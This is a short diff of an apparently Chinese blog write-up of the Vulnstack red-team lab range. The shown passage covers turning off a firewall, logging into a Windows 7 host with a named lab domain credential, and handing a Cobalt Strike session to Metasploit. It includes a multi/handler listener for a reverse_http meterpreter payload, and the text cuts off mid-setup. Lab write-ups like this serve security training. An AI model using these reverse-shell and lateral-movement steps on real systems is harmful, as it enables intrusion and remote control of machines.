@@ -564,8 +564,7 @@ netsh advfirewall <span class="token builtin class-name">set</span> allprofiles 
 <p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121449483.png"></p>
 <p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator&#x2F;hongrisec@2020成功登录这一台win7WEB主机</p>
 <p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121709477.png"></p>
-<h2 id="0x04-攻入内网及横向移动"><a href="#0x04-攻入内网及横向移动" class="headerlink" title="0x04 攻入内网及横向移动"></a>0x04 攻入内网及横向移动</h2><p>注意：这里已经在cs端进行了提权</p>
-<h3 id="4-1-将cs会话派生给msf"><a href="#4-1-将cs会话派生给msf" class="headerlink" title="4.1 将cs会话派生给msf"></a>4.1 将cs会话派生给msf</h3><p>打开MSF，开始监听</p>
+<h2 id="0x04-攻入内网及横向移动"><a href="#0x04-攻入内网及横向移动" class="headerlink" title="0x04 攻入内网及横向移动"></a>0x04 攻入内网及横向移动</h2><h3 id="4-1-将cs会话派生给msf"><a href="#4-1-将cs会话派生给msf" class="headerlink" title="4.1 将cs会话派生给msf"></a>4.1 将cs会话派生给msf</h3><p>打开MSF，开始监听</p>
 <pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
 set payload windows&#x2F;meterpreter&#x2F;reverse_http
 set lhost 192.168.1.5
